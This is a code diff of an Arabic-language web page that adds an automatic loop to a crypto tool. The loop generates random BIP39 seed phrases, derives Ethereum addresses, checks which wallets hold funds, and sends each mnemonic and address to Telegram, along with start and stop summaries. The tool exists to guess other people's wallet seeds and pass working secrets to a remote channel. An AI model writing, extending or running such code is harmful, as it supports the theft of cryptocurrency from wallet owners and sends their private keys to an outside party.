-                if (walletStatus.isActive) {
-                    addLogEntry(`🎉 العبارة المولدة تفتح محفظة نشطة! العنوان: ${address}`, 'success');
-                    updateStatus('🎉 العبارة المولدة تفتح محفظة نشطة!', 'success');
-                    
-                    if (telegramSent) {
-                        addLogEntry('✅ تم إرسال المحفظة النشطة إلى Telegram بنجاح', 'success');
-                    } else {
-                        addLogEntry('❌ فشل في إرسال المحفظة النشطة إلى Telegram', 'error');
-                    }
-                } else {
-                    addLogEntry(`❌ العبارة المولدة تفتح محفظة فارغة: ${address}`, 'info');
-                    updateStatus('❌ العبارة المولدة تفتح محفظة فارغة', 'info');
-                    
-                    if (telegramSent) {
-                        addLogEntry('✅ تم إرسال المحفظة الفارغة إلى Telegram بنجاح', 'info');
-                    } else {
-                        addLogEntry('❌ فشل في إرسال المحفظة الفارغة إلى Telegram', 'error');
-                    }
-                }
-                
-                elements.testGeneratedBtn.innerHTML = '<span>🔍 فحص العبارة المولدة</span>';
-                elements.testGeneratedBtn.disabled = false;
-                
-            } catch (error) {
-                updateStatus(`❌ خطأ في فحص العبارة المولدة: ${error.message}`, 'danger');
-                addLogEntry(`❌ خطأ في فحص العبارة المولدة: ${error.message}`, 'error');
-                elements.testGeneratedBtn.innerHTML = '<span>🔍 فحص العبارة المولدة</span>';
-                elements.testGeneratedBtn.disabled = false;
             }
         }
 
@@ -1284,22 +1458,161 @@
             elements.manualTestResult.style.display = 'block';
         }
 
-        // وظيفة نسخ العبارة المولدة
-        function copyGeneratedMnemonic() {
-            if (!lastGeneratedMnemonic) {
-                updateStatus('لا توجد عبارة مولدة للنسخ', 'warning');
+        // وظائف الفحص التلقائي للعبارات
+        async function autoTestMnemonics() {
+            try {
+                if (!checkEthersLoaded()) {
+                    return;
+                }
+
+                const mnemonic = generateRandomBIP39Phrase();
+                autoTestStats.total++;
+                
+                addLogEntry(`🤖 فحص تلقائي - عبارة ${autoTestStats.total}: ${mnemonic.substring(0, 30)}...`);
+                
+                let address;
+                try {
+                    address = await mnemonicToAddress(mnemonic);
+                } catch (error) {
+                    addLogEntry(`❌ عبارة غير صالحة: ${error.message}`, 'error');
+                    updateAutoTestStats();
+                    return;
+                }
+                
+                autoTestStats.valid++;
+                addLogEntry(`✅ عبارة صالحة - العنوان: ${address.substring(0, 20)}...`);
+                
+                const walletStatus = await isWalletActive(address);
+                
+                const testType = elements.testType.value;
+                let shouldSend = false;
+                
+                if (testType === 'all') {
+                    shouldSend = true;
+                } else if (testType === 'active' && walletStatus.isActive) {
+                    shouldSend = true;
+                } else if (testType === 'empty' && !walletStatus.isActive) {
+                    shouldSend = true;
+                }
+                
+                if (shouldSend) {
+                    const telegramSent = await sendWalletToTelegram(mnemonic, address, walletStatus, walletStatus.isActive);
+                    
+                    if (walletStatus.isActive) {
+                        autoTestStats.active++;
+                        addLogEntry(`🎉 محفظة نشطة تم إرسالها إلى Telegram`, 'success');
+                        
+                        if (telegramSent) {
+                            addLogEntry('✅ تم إرسال المحفظة النشطة إلى Telegram بنجاح', 'success');
+                        } else {
+                            addLogEntry('❌ فشل في إرسال المحفظة النشطة إلى Telegram', 'error');
+                        }
+                    } else {
+                        autoTestStats.empty++;
+                        addLogEntry(`📭 محفظة فارغة تم إرسالها إلى Telegram`, 'info');
+                        
+                        if (telegramSent) {
+                            addLogEntry('✅ تم إرسال المحفظة الفارغة إلى Telegram بنجاح', 'info');
+                        } else {
+                            addLogEntry('❌ فشل في إرسال المحفظة الفارغة إلى Telegram', 'error');
+                        }
+                    }
+                } else {
+                    if (walletStatus.isActive) {
+                        autoTestStats.active++;
+                        addLogEntry(`⚠️ محفظة نشطة (لم يتم إرسالها حسب الإعدادات)`, 'info');
+                    } else {
+                        autoTestStats.empty++;
+                        addLogEntry(`⚠️ محفظة فارغة (لم يتم إرسالها حسب الإعدادات)`, 'info');
+                    }
+                }
+                
+                updateAutoTestStats();
+                
+                const testLimit = parseInt(elements.autoTestLimit.value) || 0;
+                if (testLimit > 0 && autoTestStats.total >= testLimit) {
+                    stopAutoTest();
+                    updateStatus(`تم الوصول للحد الأقصى للفحص التلقائي (${testLimit})`, 'warning');
+                    addLogEntry(`تم إيقاف الفحص التلقائي - وصل للحد الأقصى: ${testLimit} عبارة`, 'info');
+                    
+                    // إرسال ملخص النتائج إلى Telegram
+                    const summaryMessage = `📊 <b>ملخص الفحص التلقائي</b>\n\n` +
+                        `🔢 إجمالي العبارات المفحوصة: ${autoTestStats.total}\n` +
+                        `✅ العبارات الصالحة: ${autoTestStats.valid}\n` +
+                        `🎉 المحافظ النشطة: ${autoTestStats.active}\n` +
+                        `📭 المحافظ الفارغة: ${autoTestStats.empty}\n\n` +
+                        `⏰ الوقت: ${new Date().toLocaleString('ar-EG', { timeZone: 'Africa/Cairo' })}`;
+                    
+                    await sendTelegramMessage(summaryMessage);
+                }
+                
+            } catch (error) {
+                addLogEntry(`❌ خطأ في الفحص التلقائي: ${error.message}`, 'error');
+                updateAutoTestStats();
+            }
+        }
+
+        async function startAutoTest() {
+            if (isAutoTestRunning) return;
+            
+            if (!checkEthersLoaded()) {
                 return;
             }
             
-            navigator.clipboard.writeText(lastGeneratedMnemonic)
-                .then(() => {
-                    updateStatus('تم نسخ العبارة المولدة إلى الحافظة', 'success');
-                    addLogEntry('تم نسخ العبارة المولدة إلى الحافظة', 'success');
-                })
-                .catch(err => {
-                    updateStatus('فشل في نسخ العبارة', 'danger');
-                    addLogEntry(`فشل في نسخ العبارة: ${err.message}`, 'error');
-                });
+            isAutoTestRunning = true;
+            elements.startAutoTestBtn.disabled = true;
+            elements.stopAutoTestBtn.disabled = false;
+            
+            // إعادة تعيين الإحصائيات
+            autoTestStats = {
+                total: 0,
+                valid: 0,
+                active: 0,
+                empty: 0
+            };
+            updateAutoTestStats();
+            
+            const speed = parseInt(elements.autoTestSpeed.value) || 2000;
+            const testType = elements.testType.value;
+            
+            updateStatus('جاري بدء الفحص التلقائي...', 'info');
+            addLogEntry(`🤖 تم بدء الفحص التلقائي (النوع: ${testType === 'all' ? 'الكل' : testType === 'active' ? 'النشطة فقط' : 'الفارغة فقط'})`);
+            
+            const startMessage = `🤖 <b>بدء الفحص التلقائي للعبارات</b>\n\n` +
+                `📊 نوع الفحص: ${testType === 'all' ? 'جميع العبارات' : testType === 'active' ? 'العبارات النشطة فقط' : 'العبارات الفارغة فقط'}\n` +
+                `⏰ الوقت: ${new Date().toLocaleString('ar-EG', { timeZone: 'Africa/Cairo' })}\n` +
+                `🔍 جاري فحص العبارات وإرسال النتائج إلى Telegram...`;
+            
+            await sendTelegramMessage(startMessage);
+            
+            autoTestInterval = setInterval(autoTestMnemonics, speed);
+        }
+
+        async function stopAutoTest() {
+            if (!isAutoTestRunning) return;
+            
+            isAutoTestRunning = false;
+            elements.startAutoTestBtn.disabled = false;
+            elements.stopAutoTestBtn.disabled = true;
+            
+            if (autoTestInterval) {
+                clearInterval(autoTestInterval);
+                autoTestInterval = null;
+            }
+            
+            updateStatus('تم إيقاف الفحص التلقائي', 'warning');
+            addLogEntry('⏹️ تم إيقاف الفحص التلقائي');
+            
+            // إرسال ملخص النتائج إلى Telegram
+            const summaryMessage = `⏹️ <b>تم إيقاف الفحص التلقائي</b>\n\n` +
+                `📊 <b>النتائج النهائية:</b>\n` +
+                `🔢 إجمالي العبارات المفحوصة: ${autoTestStats.total}\n` +
+                `✅ العبارات الصالحة: ${autoTestStats.valid}\n` +
+                `🎉 المحافظ النشطة: ${autoTestStats.active}\n` +
+                `📭 المحافظ الفارغة: ${autoTestStats.empty}\n\n` +
+                `⏰ الوقت: ${new Date().toLocaleString('ar-EG', { timeZone: 'Africa/Cairo' })}`;
+            
+            await sendTelegramMessage(summaryMessage);
         }
 
         // وظائف التحكم
@@ -1377,7 +1690,8 @@
         elements.testTelegramBtn.addEventListener('click', testTelegramConnection);
         elements.clearLogsBtn.addEventListener('click', clearLogs);
         elements.testManualBtn.addEventListener('click', testManualMnemonic);
-        elements.testGeneratedBtn.addEventListener('click', testGeneratedMnemonic);
+        elements.startAutoTestBtn.addEventListener('click', startAutoTest);
+        elements.stopAutoTestBtn.addEventListener('click', stopAutoTest);
 
         // التحقق من تحميل ethers.js عند بدء التطبيق
         document.addEventListener('DOMContentLoaded', function() {
@@ -1385,11 +1699,13 @@
                 updateStatus('✅ تم تحميل مكتبة ethers.js بنجاح. جاهز للبدء...', 'success');
                 addLogEntry('✅ تم تحميل مكتبة ethers.js بنجاح', 'success');
                 addLogEntry('🪙 التطبيق يدعم الآن جميع العملات: ETH, USDT, USDC, DAI, LINK, UNI, WBTC, AAVE, SHIB', 'success');
+                addLogEntry('🤖 تم إضافة نظام الفحص التلقائي للعبارات النشطة والفارغة', 'success');
             }
         });
 
         // تحديث الإحصائيات عند بدء التطبيق
         updateStats();
+        updateAutoTestStats();
     </script>
 </body>
 </html>
